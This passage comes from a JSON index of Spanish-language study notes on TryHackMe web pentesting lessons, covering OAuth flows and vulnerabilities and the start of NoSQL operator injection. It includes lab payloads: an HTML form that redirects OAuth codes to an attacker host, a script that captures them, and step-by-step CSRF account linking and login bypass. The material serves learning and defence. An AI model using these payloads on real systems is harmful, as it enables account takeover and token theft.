acceso. Por el contrario, el endpoint de autorizaci√≥n es donde el due√±o del recurso se autentifica y autoriza al cliente para acceder a recursos protegidos.",
    "modified": "2025-12-22T00:56:16"
  },
  {
    "title": "8. Other Vulnerabilities and Evolution of OAuth 2.1",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/8-other-vulnerabilities-and-evolution-of-oauth-2-1/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/8. Other Vulnerabilities and Evolution of OAuth 2.1.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "Aparte de las vulnerabilidades previamente vistas, los atacantes pueden explotar otras varias debilidades cr√≠ticas en las implementaciones OAuth. Las siguientes son algunas vulnerabilidades adicionales que los pentesters deber√≠an tener en cuenta.\n\n---------------------------------------------\n<h2>Expiraci√≥n de Token Insuficiente</h2>\nLos tokens de acceso con un amplio o infinito tiempo de expiraci√≥n suponen un riesgo importante. Si un atacante obtiene dicho token, pueden acceder a recursos protegidos indefinidamente. Implementar tokens con poco tiempo de acceso mitiga este problema.\n\n-----------------------------------------\n<h2>Ataques de Replay</h2>\nInvolucran capturar tokens v√°lidos y reutilizarlos para ganar acceso no autorizado. Los atacantes pueden explotar estos tokens m√∫ltiples veces sin mecanismos para detectar y prevenir reuso de tokens. Implementar valores `nonce` y comprobaciones `timestamp` puede ayudar a mitigar este tipo de ataques asegurando que cada token s√≥lo se utiliza una vez.\n\n--------------------------------------------\n<h2>Almacenamiento Inseguro de Tokens</h2>\nEsto puede llevar a robo de tokens y acceso no autorizado. Usar mecanismos de guardado de tokens seguros, como cookies seguras o bases de datos encriptadas, puede ayudar a proteger el token de ser obtenido por actores maliciosos.\n\n---------------------------------\n<h2>Evoluci√≥n de OAuth 2.1</h2>\nOAuth 2.1 representa la √∫ltima iteraci√≥n en la evoluci√≥n del est√°ndar OAuth, construido con OAuth 2.0 como base para mejorar la seguridad. La traves√≠a de OAuth 2.0 a OAuth 2.1 ha estado marcada por la necesidad de mitigar vulnerabilidades conocidas e incorporar las mejores pr√°cticas que pueden emerger desde que la especificaci√≥n original se public√≥.\n<h4>Cambios Importantes</h4>\nOAuth introduce varios cambios clave que buscan fortalecer el protocolo.\n\n- Obsolescencia de `implicit grant type`.\n- Exigencia de uso del par√°metro `state`.\n- Enfatiza la importancia de manejar y almacenar los tokens de forma segura.\n- Ofrece gu√≠as m√°s claras para la validaci√≥n de la URI de redirecci√≥n.",
    "modified": "2025-12-24T00:53:35"
  },
  {
    "title": "5. Exploiting OAuth - Stealing OAuth Token",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/5-exploiting-oauth-stealing-oauth-token/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/5. Exploiting OAuth - Stealing OAuth Token.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "Los tokens juegan un rol cr√≠tico en el framework OAuth 2.0, actuando como claves digitales que otorgan acceso a recursos protegidos. Estos tokens son emitidos por el servidor de autorizaci√≥n y redirigidos a la aplicaci√≥n del cliente bas√°ndose en el par√°metro `redirect_uri`. Esta redirecci√≥n es crucial en el flujo OAuth, asegurando que los tokens se transmiten de forma segura al receptor. Sin embargo, si el `redirect_uri` no est√° bien protegido, los atacantes pueden explotarlo para secuestrar tokens.\n\n---------------------------------\n<h2>Rol de Redirect_URI</h2>\nEl par√°metro `redirect_uri` se especifica durante el flujo OAuth para redirigir el token desde el servidor de autorizaci√≥n, despu√©s de que la autorizaci√≥n se lleve a cabo. Esta URI debe estar preregistrada en los ajustes de la aplicaci√≥n para prevenir vulnerabilidades de redirecci√≥n abierta. Durante el proceso OAuth, el servidor comprueba que la `redirect_uri` proporcionada coincide con una de las registradas.\n\n---------------------------------\n<h2>Vulnerability</h2>\nUna `redirect_uri` insegura puede llevar a problemas severos de seguridad. Si los atacantes ganan control sobre cualquier dominio o URI listada en `redirect_uri`, pueden manipular el flujo para interceptar los tokens. Aqu√≠ se muestra c√≥mo deber√≠a ser explotado:\n\n- Considera una aplicaci√≥n OAuth con las siguientes URIs de redirecci√≥n registradas:\n  ![[Pasted image 20251222200934.png]]\n- **Estrategia del Atacante:** Si un atacante gana control sobre `dev.bistro.thm`, pueden explotar el flujo OAuth. Configurando la `redirect_uri` a `http://dev.bistro.thm/callback`, el servidor de autorizaci√≥n mandar√° el token a este dominio controlado por √©l.\n- **Ataque Construido:** El atacante inicia un flujo OAuth y asegura que `redirect_uri` apunta a su dominio controlado. Despu√©s de que el usuario autorice a la aplicaci√≥n, el token es mandado a `http://dev.bistro.thm/callback`. El atacante puede ahora capturar este token y usarlo para acceder a recursos protegidos.\n\n--------------------------------\n<h2>Preparando el Payload (Prespectiva del Atacante)</h2>\n>[!CAUTION] Antes de empezar el ejercicio, aseg√∫rate de que tienes la sesi√≥n de la v√≠ctima cerrada visitando http://coffee.thm:8000/admin/logout.\n\nPara este ejercicio asumimos que el atacante ha comprometido el dominio `dev.bistro.thm:8002` y puede hostear cualquier p√°gina HTML en el servidor. Considera a Tom, una v√≠ctima a la cual se le mandar√° el link. El atacante puede construir una p√°gina HTML simple (`redirect_uri.html`) con el siguiente c√≥digo:\n\n```html\n<form action=\"http://coffee.thm:8000/oauthdemo/oauth_login/\" method=\"get\">\n    <input type=\"hidden\" name=\"redirect_uri\" value=\"http://dev.bistro.thm:8002/malicious_redirect.html\">\n    <input type=\"submit\" value=\"Hijack OAuth\">\n</form>\n```\n\nEste formulario manda un par√°metro escondido `redirect_uri` con el valor `http://dev.bistro.thm:8002/malicious_redirect.html` y subir la petici√≥n a http://coffee.thm:8000/oauthdemo/oauth_login/. La p√°gina `malicious_redirect.html` interceptar√≠a el c√≥digo de autorizaci√≥n de la URL usando el siguiente c√≥digo:\n\n```html\n<script>\n    // Extract the authorization code from the URL\n    const urlParams = new URLSearchParams(window.location.search);\n    const code = urlParams.get('code');\n    document.getElementById('auth_code').innerText = code;\n    console.log(\"Intercepted Authorization Code:\", code);\n    // code to save the acquired code in database/file etc\n</script>\n```\n\n>[!NOTE] Como el atacante tiene control total del subdominio, una vez que redirige a una v√≠ctima, guardar√° las credenciales en una base de datos/archivo para usarlo despu√©s.\n\nEl atacante puede mandarle a Tom el link (http://dev.bistro.thm:8002/redirect_uri.html) mediante ingenier√≠a social o CSRF. La v√≠ctima, inocente, hace click en el link, lo que lo lleva a `dev.bistro.thm:8002/redirect_uri.html`.\n\nAbre dicho link en la m√°quina virtual como \"v√≠ctima\". Ver√°s esto:\n\n![[Pasted image 20251222202318.png]]\n\nCuando la v√≠ctima hace click en \"Login via OAuth\", el formulario llama a `http://coffee.thm:8000/oauthdemo/oauth_login/` pero con una `redirect_uri` falsificada. Una vez que la v√≠ctima introduce sus credenciales (`victim:victim123`) en el proveedor de OAuth, redirige el c√≥digo de autorizaci√≥n OAuth a la URL (`http://dev.bistro.thm:8002/malicious_redirect.html`) controlada por el atacante, permiti√©ndole interceptar y usar para sus fines el c√≥digo de autorizaci√≥n.\n\n![[Pasted image 20251222202750.png]]\n\n--------------------------------------\n<h2>Perspectiva del Atacante</h2>\nDesde la m√°quina del atacante, pueden utilizar el c√≥digo de autorizaci√≥n interceptada para llamar al endpoint `/callback` e intercambiarlo por un token v√°lido. Con este token, el atacante gana acceso no autorizado a los recursos protegidos del usuario. Para obtener este token, visita la URL http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxx y reemplaza `code` por el c√≥digo adquirido.\n\n![[Pasted image 20251222202955.png]]",
    "modified": "2025-12-24T00:53:35"
  },
  {
    "title": "3. How OAuth Flow Works",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/3-how-oauth-flow-works/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/3. How OAuth Flow Works.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "El flujo OAuth 2.0 comienza cuando un usuario (due√±o del recurso) interact√∫a con una aplicaci√≥n cliente (cliente) y pide acceso a un recurso espec√≠fico. EL cliente redirige al usuario a un servidor de autorizaci√≥n, donde se le pide al usuario que inicie sesi√≥n y otorgar acceso. Si el usuario consiente, el servidor de autorizaci√≥n emite un c√≥digo de autentificaci√≥n, el cual el cliente puede intercambiar por un token de acceso. Este token permite al cliente acceder al servidor de recursos y obtener el recurso pedido en nombre del usuario.\n\n![[Pasted image 20251222124900.png]]\n\nVeremos ahora los pasos del flujo de trabajo de OAuth en detalle, considerando el mismo ejemplo de la cafeter√≠a.\n\n------------------------------------------\n<h2>Conectarse a la M√°quina</h2>\nLe damos a \"Start Machine\" y esperamos 1-2 minutos. Tenemos que ir al archivo `/etc/hosts` y a√±adir la entrada `<IP_tun0>    cofee.thm bistro.thm`.\n\nUsaremos una versi√≥n personalizada de Django OAuth. FactBook el el proveedor OAuth. Puedes visitar http://coffee.thm:8000/admin para ver el panel de inicio de sesi√≥n del proveedor OAuth, que seguir√° siendo el mismo a lo largo de la sesi√≥n.\n\n![[Pasted image 20251222131427.png]]\n\nUsaremos las siguientes credenciales para esta tarea:\n\n- **V√≠ctima:** `victim:victim123`\n- **Atacante:** `attacker:tesla@123`\n\n>[!NOTE] No es necesario que inicies sesi√≥n todav√≠a.\n\nUna vez inicies sesi√≥n en el proveedor OAuth, puedes iniciar sesi√≥n en cualquier otra p√°gina web, como har√≠as con `Sign Up with Google` en X, Facebook o cualquier otra p√°gina.\n\nAhora visita http://bistro.thm:8000/, la cual usaremos para comprender el flujo de trabajo de OAuth. Entenderemos el flujo consideramdo a una persona llamada Tom, quien quiere iniciar sesi√≥n en una p√°gina diferente usando su cuenta de `CoffeeShopApp`.\n\n-------------------------------------\n<h2>Petici√≥n de Autorizaci√≥n</h2>\nTom visita primero `bistro.thm`, donde quiere iniciar sesi√≥n via `CoffeeShopApp`. Cuando hace click en \"Login via OAuth\", `CoffeeShopApp` debe primero obtener su permiso, por lo que la aplicaci√≥n redirige a su navegador al servidor de autorizaci√≥n con una petici√≥n de autorizaci√≥n.\n\n![[Pasted image 20251222133239.png]]\n\nSi haces click en \"Login with OAuth\", ser√°s redirigido al servidor de autorizaci√≥n con la URL `http://coffee.thm:8000/accounts/login/?next=/o/authorize/%3Fclient_id%3Dzlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//bistro.thm%3A8000/oauthdemo/callback`, como se muestra debajo:\n\n![[Pasted image 20251222133336.png]]\n\nEl sitio web del bistro inicia este proceso redirigiendo a Tom al servidor de autorizaci√≥n con los siguientes par√°metros incluidos en la URL:\n\n- `response_type=code`: Esto indica que `CoffeeSopApp` espera un c√≥digo de autorizaci√≥n como respuesta.\n- `state`: Un token CSRF para asegurar que la petici√≥n y respuesta son parte de la misma transacci√≥n.\n- `client_id`: Un identificador p√∫blico para la aplicaci√≥n del cliente, identificando de forma √∫nica a `CoffeeShopApp`.\n- `redirect_uri`: La URL donde el servidor de autorizaci√≥n mandar√° a Tom despu√©s de que otorgue permiso. Debe coincidir con una de las URIs preregistradas para la aplicaci√≥n del cliente.\n- `scope`: Especifica el nivel de acceso pedido, como ver pedidos de caf√©.\n\nIncluyendo estos par√°metros, la app del bistro se asegura de que el servidor de autorizaci√≥n entiende lo que se le est√° pidiendo y d√≥nde mandar al usuario despu√©s. Aqu√≠ est√° el c√≥digo de Python que redirige al usuario al servidor de autorizaci√≥n.\n\n```python\ndef oauth_login(request):\n    app = Application.objects.get(name=\"CoffeeApp\")\n    redirect_uri = request.GET.get(\"redirect_uri\", \"http://bistro.thm:8000/oauthdemo/callback\")\n    \n    authorization_url = (\n        f\"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}\"\n    )\n    return redirect(authorization_url)\n```\n\n-------------------------------------------\n<h2>Autentificaci√≥n y Autorizaci√≥n</h2>\nCuando Tom llega al servidor de autorizaci√≥n, se le pide iniciar sesi√≥n usando sus credenciales. Este paso asegura que el servidor pueda verificar su identidad. Despu√©s de haber iniciado sesi√≥n correctamente, el servidor de autorizaci√≥n le pregunta a Tom si accede a permitir a la app del bistro a acceder a sus detalles. Este paso de consentimiento es crucial, ya que le da a Tom transparencia y control sobre qu√© aplicaciones pueden acceder a su informaci√≥n.\n\nEste proceso t√≠picamente envuelve:\n\n- **User Login:** Tom introduce su nombre de usuario y contrase√±a en el login del servidor de autorizaci√≥n.\n- **Consent Prompt:** Despu√©s de la autentificaci√≥n, el servidor de autorizaci√≥n le presenta a Tom una pantalla de consentimiento detallando a qu√© pide acceso `CoffeeShopApp`. Tom debe decidir si acepta o deniega dichos permisos.\n  \n  ![[Pasted image 20251222134716.png]]\n\nEste doble paso asegura que la identidad de Tom est√© autentificada y que su consentimiento expl√≠cito es obtenido antes de que se otorgue cualquier acceso, manteniendo la seguridad y el control del usuario sobre su informaci√≥n personal.\n\n-----------------------------------------\n<h2>Respuesta de Autorizaci√≥n</h2>\nSi Tom acepta otorgar acceso, el servidor de autorizaci√≥n genera un c√≥digo de autorizaci√≥n, como le pide la petici√≥n. El servidor entonces redirige a Tom al sitio del bistro usando la `redirect_uri` especificada. La redirecci√≥n incluye el c√≥digo de autorizaci√≥n y el par√°metro `state` original para asegurar la integridad del flujo.\n\nEl servidor de autorizaci√≥n responde con:\n\n- `code`: `CoffeeShopApp` usar√° el c√≥digo de autorizaci√≥n para pedir un token de acceso.\n- `state`: El token CSRF previamente mandado por `CoffeeShopApp` para validar la respuesta.\n\nUn ejemplo de respuesta ser√≠a: `https://bistro.thm:8000/callback?code=AuthCode123456&state=xyzSecure123`.\n\nEste paso asegura que el proceso de autorizaci√≥n sea seguro y que la respuesta est√© ligada a la petici√≥n inicial del bistro. El c√≥digo de autorizaci√≥n es un token temporal que ser√° usado en el pr√≥ximo paso para obtener un token de acceso, permitiendo a `CoffeeShopApp` acceder a los detalles del perfil de Tom.\n\n-----------------------------------------\n<h2>Petici√≥n del Token</h2>\nEl sitio web del bistro intercambia el c√≥digo de autorizaci√≥n por un token de acceso haciendo una petici√≥n POST al endpoint token del servidor de autorizaci√≥n con los siguientes par√°metros:\n\n- `grant_type`: Tipo de permiso que se usa, normalmente declarado como `code` para especificar c√≥digo de autorizaci√≥n como tipo de permiso.\n- `code`: El c√≥digo de autorizaci√≥n obtenido del servidor de autorizaci√≥n.\n- `redirect_uri`: Debe coincidir con la URI de redirecci√≥n original dada en la petici√≥n de autorizaci√≥n.\n- `client_id` y `client_secret`: Credenciales para autentificar la aplicaci√≥n del cliente.\n\nUsando los par√°metros de arriba, el siguiente c√≥digo har√° una petici√≥n de token al endpoint `/o/token`.\n\n```python\ntoken_url = \"http://coffee.thm:8000/o/token/\"\n    client_id = Application.objects.get(name=\"CoffeeApp\").client_id\n    client_secret = Application.objects.get(name=\"CoffeeApp\").client_secret\n    redirect_uri = request.GET.get(\"redirect_uri\", \"http://bistro.thm:8000/oauthdemo/callback\")\n    \n    data = {\n        \"grant_type\": \"authorization_code\",\n        \"code\": code,\n        \"redirect_uri\": redirect_uri,\n        \"client_id\": client_id,\n        \"client_secret\": client_secret,\n    }\n    \n    headers = {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'Authorization': f'Basic {base64.b64encode(f\"{client_id}:{client_secret}\".encode()).decode()}',\n    }\n    \n    response = requests.post(token_url, data=data, headers=headers)\n    tokens = response.json()\n```\n\nLa app del bistro intercambia de forma segura el c√≥digo de autorizaci√≥n por un token de acceso mandando esta petici√≥n. El servidor de autorizaci√≥n verificar√° la informaci√≥n ofrecida, asegurando que la petici√≥n es v√°lida y se origina del cliente pidiendo el c√≥digo de autorizaci√≥n. Si todo es correcto, el servidor de autorizaci√≥n responder√° con el token de acceso, permitiendo al sitio del bistro proceder a acceder a los detalles del perfil de Tom.\n\n------------------------------\n<h2>Respuesta del Token</h2>\nEl servidor de autorizaci√≥n autentifica la web del bistro y valida el c√≥digo de autorizaci√≥n. Al validarse exitosamente, el servidor responde con un `Access Token` y, opcionalmente un `Refresh Token`.\n\nLa respuesta del servidor de autorizaci√≥n incluye lo siguiente:\n\n- `access_token`: Token que ser√° usado para acceder a los detalles de Tom.\n- `token_type`: T√≠picamente \"Bearer\".\n- `expires_in`: La duraci√≥n en segundos para la que el token de acceso es v√°lido.\n- `refresh_token (opcional)`: Un token usado para obtener un nuevo token de acceso sin requerir que el usuario vuelva a iniciar sesi√≥n.\n\nCon el token de acceso, el sitio web del bistro puede hacer peticiones autentificadas al servidor de recursos para acceder a los detalles de perfil de Tom. El token de refresco opcional puede usarse para pedir un nuevo token de acceso una vez que el actual expira, ofreciendo una mejor experiencia de usuario al hacer que Tom no tenga que volver a iniciar sesi√≥n cuando su token expira.",
    "modified": "2025-12-23T00:53:19"
  },
  {
    "title": "6. Exploiting OAuth - CSRF in OAuth",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/6-exploiting-oauth-csrf-in-oauth/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/6. Exploiting OAuth - CSRF in OAuth.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "El par√°metro state en el framework OAuth protege contra ataque CSRF, que ocurren cuando un atacante enga√±a a un usuario para que ejecute acciones no deseadas en una aplicaci√≥n web donde est√°n siendo autentificadas. Esto puede conllevar a la divulgaci√≥n de informaci√≥n sensible. El par√°metro state permite mitigar este riesgo manteniendo la integridad del proceso de autorizaci√≥n.\n\n------------------------------------------------\n<h2>Vulnerabilidad de Par√°metro State D√©bil o Flatante</h2>\nEl par√°metro state es una string arbitraria que la aplicaci√≥n cliente incluye en la petici√≥n de autorizaci√≥n. Cuando el servidor de autorizaci√≥n redirige al usuario de vuelta a la aplicaci√≥n cliente con el c√≥digo de autorizaci√≥n, tambi√©n incluye el par√°metro state. Entonces la aplicaci√≥n cliente verifica que el par√°metro state en la respuesta coincide con con la mandada originalmente. \n\nPor ejemplo, considera una implementaci√≥n OAuth donde el par√°metro state falta o es predecible. Un atacante puede iniciar un flujo OAuth y ofrecer su URI de redirecci√≥n maliciosa. Despu√©s de que el usuario se autentifique y autorice a la aplicaci√≥n, el servidor de autorizaci√≥n redirige el c√≥digo de autorizaci√≥n a la URI controlada por el atacante, como se especifica en el par√°metro state d√©bil o faltante.\n\n--------------------------------------\n<h2>Pr√°ctica</h2>\nEn este ejercicio, exploraremos c√≥mo la ausencia del par√°metro state en el proceso de autorizaci√≥n OAuth puede llevar a ataques CSRF. Usaremos la app `mycontacts.thm:8080` que permite sincronizar contactos de cualquier plataforma.\n\n>[!CAUTION] Antes de empezar aseg√∫rate de haber cerrado sesi√≥n visitando http://coffee.thm:8000/admin/logout\n\n<h4>Perspectiva del Atacante</h4>\nPrimero visita `http://mycontacts.thm:8080/csrf/index.php` con las credenciales `attacker:attacker`. Una vez que inicies sesi√≥n, ver√°s una p√°gina que permite sincronizar contactos a `CoffeeShopApp`. Una vez que las cuentas est√©n sincronizadas, se transferir√° todos los contactos a la cuenta `CoffeeShopApp`.\n\n![[Pasted image 20251223145428.png]]\n\nSi haces click en \"Sync Contacts\" ser√°s redirigido a un servidor de autorizaci√≥n OAuth con la URL `http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http%3A%2F%2Fcoffee.thm%2Fcsrf%2Fcallbackcsrf.php`.\n\nComo pentester, te das cuenta de que a la petici√≥n le falta, sugiriendo la posibilidad de un ataque CSRF. Aqu√≠ no necesitas sincronizar tu cuenta. Explotaremos esta vulnerabilidad para ligar la cuenta de la v√≠ctima a la del atacante.\n\n---------------------------------------\n<h2>Explotando la Vulnerabilidad</h2>\nSin el par√°metro `state`, el proceso de autorizaci√≥n es vulnerable a CSRF. El atacante puede explotar esta vulnerabilidad obteniendo el c√≥digo de autorizaci√≥n de la v√≠ctima y mand√°ndolo al atacante. El servidor de autorizaci√≥n no tiene manera de saber si el c√≥digo de autorizaci√≥n pertenece al atacante o la v√≠ctima y tampoco de saber si la petici√≥n viene de uno o de otro.\n\n--------------------------------------\n<h2>Preparando el Payload</h2>\nPara preparar el payload, el atacante debe obtener el c√≥digo de autorizaci√≥n. Esto puede hacerse interceptando el proceso de autorizaci√≥n usando una herramienta como Burp Suite o cualquier otra. El link http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/ te permite obtener el c√≥digo de autorizaci√≥n sin completar el flujo OAuth. El c√≥digo del flujo es bastante directo como se muestra abajo:\n\n```python\ndef oauth_logincsrf(request):\n    app = Application.objects.get(name=\"ContactApp\")\n    redirect_uri = request.POST.get(\"redirect_uri\", \"http://coffee.thm/csrf/callbackcsrf.php\") \n    \n    authorization_url = (\n        f\"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}\"\n    )\n    return redirect(authorization_url)\n\ndef oauth_callbackflagcsrf(request):\n    code = request.GET.get(\"code\")\n    \n    if not code:\n        return JsonResponse({'error': 'missing_code', 'details': 'Missing code parameter.'}, status=400) \n\n    if code:\n        return JsonResponse({'code': code, 'Payload': 'http://coffee.thm/csrf/callbackcsrf.php?code='+code}, status=400) \n```\n\nObtendr√°s la siguiente respuesta una vez que visites dicho link para obtener el c√≥digo de autorizaci√≥n con las credenciales `attacker:tesla@123`.\n\n![[Pasted image 20251223152748.png]]\n\nEl c√≥digo de autorizaci√≥n de arriba permitir√≠a a cualquier persona obtener el token. El par√°metro URL en la respuesta es el payload que debemos mandar a la v√≠ctima. Copia el valor `Payload`.\n\n-------------------------------------------\n<h2>Lanzando el Ataque</h2>\n- Una vez que el atacante ha obtenido el c√≥digo de autorizaci√≥n, puede preparar el payload CSRF. Sup√≥n que el atacante manda un email a la v√≠ctima con el link `http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx`.\n- Despu√©s de recibir el email, si la v√≠ctima hace click en el o lo ejecuta en su navegador, (donde `xxxx` es el c√≥digo de autorizaci√≥n del atacante), la cuenta OAuth de `CoffeShopApp` del atacante ser√° ligada con la de la v√≠ctima, obteniendo as√≠ todos sus contactos.\n\n<h4>Perspectiva de la V√≠ctima</h4>\n- Para comprobarlo como v√≠ctima, inicia sesi√≥n en http://bistro.thm:8080/csrf/ con las credenciales `victim:victim`. Como el c√≥digo de autorizaci√≥n es √∫nico, ejecuta el exploit del atacante con su c√≥digo de autorizaci√≥n peg√°ndolo directamente en el navegador (`http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx`).\n- Como hemos visto arriba, el mismo link mandado a la v√≠ctima es el par√°metro URL recibido durante el proceso de \"Preparando el Payload\". Una vez ejecutado, el c√≥digo har√° una llamada para obtener el token de acceso y mandar los contactos a la cuenta del atacante.\n  \n  ![[Pasted image 20251223154633.png]]",
    "modified": "2025-12-24T00:53:35"
  },
  {
    "title": "4. Identifying the OAuth Services",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/4-identifying-the-oauth-services/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/4. Identifying the OAuth Services.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "<h2>Identificando Uso de OAuth en una Aplicaci√≥n</h2>\nLa primera indicaci√≥n de que una aplicaci√≥n usa OAuth es com√∫nmente encontrada en el proceso de login. Busca opciones que permitan a los usuarios iniciar sesi√≥n usando proveedores de servicios externos como Google, Facebook o GitHub. Estas opciones redirigen a los usuarios a la p√°gina de autorizaci√≥n del proveedor de servicios.\n\n----------------------------------------\n<h2>Detectando la Implementaci√≥n de OAuth</h2>\nAl analizar el tr√°fico de red durante el proceso de login, presta atenci√≥n a las redirecciones HTTP. Las implementaciones OAuth redirigir√°n al navegador (generalmente) a la URL del servidor de autorizaci√≥n. Esta URL contiene par√°metros espec√≠ficos como `response_type`, `client_id`, `redirect_uri`, `scope` y `state`. Estos par√°metros son indicativos de un flujo OAuth en progreso. Por ejemplo, una URL puede verse as√≠:\n\n`https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123`\n\n--------------------------------------------\n<h2>Identificando el Framework de OAuth</h2>\nUna vez confirmado que OAuth est√° siendo usado, el siguiente paso es identificar el framework o librer√≠a espec√≠ficos que la aplicaci√≥n emplea. Esto puede ofrecer una vista detallada de las vulnerabilidades potenciales. Aqu√≠ hay algunas estrategias para identificar el framework OAuth:\n\n- **HTTP Headers and Responses:** Inspecciona los headers HTTP y los bodies de la respuesta en busca de identificadores o comentarios referenciando librer√≠as o frameworks OAuth.\n- **Source Code Analysis:** Si puedes acceder al c√≥digo fuente de la aplicaci√≥n, busca palabras clave espec√≠ficas y afirmaciones importantes que puedan revelar el framework en uso. Por ejemplo, librer√≠as como `django-oauth-toolkit`, `oauthlib`, `spring-security-oauth` o `passport` en `Node.js`, cada uno tiene caracter√≠sticas y convenciones de nombres √∫nicas.\n- **Authorization and Token Endpoints:** Analiza los endpoints usados para obtener c√≥digos de autorizaci√≥n y tokens de acceso. Diferentes implementaciones OAuth pueden tener patrones o estructuras √∫nicos de endpoints. Por ejemplo, el `Django OAuth Toolkit` normalmente sigue el patr√≥n `/oauth/authorize/` y `/oauth/token/`, mientras que otros frameworks usan rutas diferentes.\n- **Error Messages:** Los mensajes de error y debug personalizados pueden revelar la tecnolog√≠a subyacente. Los mensajes de error detallados pueden incluir referencias a una librer√≠a o framework espec√≠ficos.",
    "modified": "2025-12-23T00:53:19"
  },
  {
    "title": "0. OAuth Vulnerabilities",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/0-oauth-vulnerabilities/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/0. OAuth Vulnerabilities.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "[[1. Key Concepts]]\n[[2. OAuth Grant Types]]\n[[3. How OAuth Flow Works]]\n[[4. Identifying the OAuth Services]]\n[[5. Exploiting OAuth - Stealing OAuth Token]]\n[[6. Exploiting OAuth - CSRF in OAuth]]\n[[7. Exploiting OAuth - Implicit Grant Flow]]\n[[8. Other Vulnerabilities and Evolution of OAuth 2.1]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Operator Injection - Bypassing the Login Screen",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-nosql-injection/3-operator-injection-bypassing-the-login-screen/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. NoSQL Injection/3. Operator Injection - Bypassing the Login Screen.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 2. NoSQL Injection",
    "content": "<h2>Bypassear la Pantalla de Login</h2>\nPrimero vamos a la p√°gina que nos dan y mandamos un usuario y contrase√±a incorrectos para capturar la petici√≥n con Burp Suite.\n\n![[Pasted image 20260111120955.png]]\n\nLa petici√≥n original se ve as√≠:\n\n![[Pasted image 20260111121114.png]]\n\nAhora vamos a probar otro login y modificamos la petici√≥n para mandar arrays en `user` y `pass`:\n\n![[Pasted image 20260111121332.png]]\n\nEsto fuerza a la base de datos a devolver todos los documentos y como resultado iniciamos sesi√≥n en la aplicaci√≥n.\n\n![[Pasted image 20260111121959.png]]",
    "modified": "2026-01-12T00:57:54"
  },
  {
    "title": "5. Operator Injection - Extracting Users Passwords",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-nosql-injection/5-operator-injection-extracting-users-passwords/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. NoSQL Injection/5. Operator Injection - Extracting Users Passwords.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 2. NoSQL Injection",
